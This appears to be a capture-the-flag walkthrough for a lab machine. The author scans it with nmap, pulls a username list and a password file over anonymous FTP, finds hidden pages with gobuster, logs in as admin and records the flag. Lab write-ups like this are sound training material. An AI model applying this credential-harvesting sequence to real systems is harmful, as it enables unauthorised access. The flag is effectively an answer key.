target ip :: 10.129.217.162

	start with namp enumration.
			sudo nmap -sCV -T5 10.129.217.162 -Pn -oN nmap.txt
			PORT   STATE SERVICE VERSION
			21/tcp open  ftp     vsftpd 3.0.3
			| ftp-anon: Anonymous FTP login allowed (FTP code 230)
			| -rw-r--r--    1 ftp      ftp            33 Jun 08  2021 allowed.userlist
			|_-rw-r--r--    1 ftp      ftp            62 Apr 20  2021 allowed.userlist.passwd
			| ftp-syst: 
			|   STAT: 
			| FTP server status:
			|      Connected to ::ffff:10.10.14.228
			|      Logged in as ftp
			|      TYPE: ASCII
			|      No session bandwidth limit
			|      Session timeout in seconds is 300
			|      Control connection is plain text
			|      Data connections will be plain text
			|      At session startup, client count was 3
			|      vsFTPd 3.0.3 - secure, fast, stable
			|_End of status
			80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
			|_http-server-header: Apache/2.4.41 (Ubuntu)
			|_http-title: Smash - Bootstrap Business Template
			Service Info: OS: Unix

		here we can see only two ports are open 

		FTP port have some usefull information as we can see on result



		let get the files and see what it contains 

		ftp 10.129.217.162

		-rw-r--r--    1 ftp      ftp            33 Jun 08  2021 allowed.userlist
		-rw-r--r--    1 ftp      ftp            62 Apr 20  2021 allowed.userlist.passwd


      cat allowed.userlist.passwd 
      root
      Supersecretpassword1
      @BaASD&9032123sADS
      rKXM59ESxesUFHAd


      cat allowed.userlist       
      aron
      pwnmeow
      egotisticalsw
      admin

here we have admin and it's password rKXM59ESxesUFHAd


hit the ip on browser and see what we get

lets find the other directory by using a gobuster.

      gobuster dir -u http://10.129.217.162/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -t 50 -x .php

      ===============================================================
      /login.php            (Status: 200) [Size: 1577]
      /assets               (Status: 301) [Size: 317] [--> http://10.129.217.162/assets/]
      /css                  (Status: 301) [Size: 314] [--> http://10.129.217.162/css/]   
      /js                   (Status: 301) [Size: 313] [--> http://10.129.217.162/js/]    
      /logout.php           (Status: 302) [Size: 0] [--> login.php]                      
      /config.php           (Status: 200) [Size: 0]                                      
      /fonts                (Status: 301) [Size: 316] [--> http://10.129.217.162/fonts/] 
      /dashboard            (Status: 301) [Size: 320] [--> http://10.129.217.162/dashboard/]


we can see there is /login.php 

use admin and rKXM59ESxesUFHAd to login 


FLG::c7110277ac44d78b6a9fff2232434d16
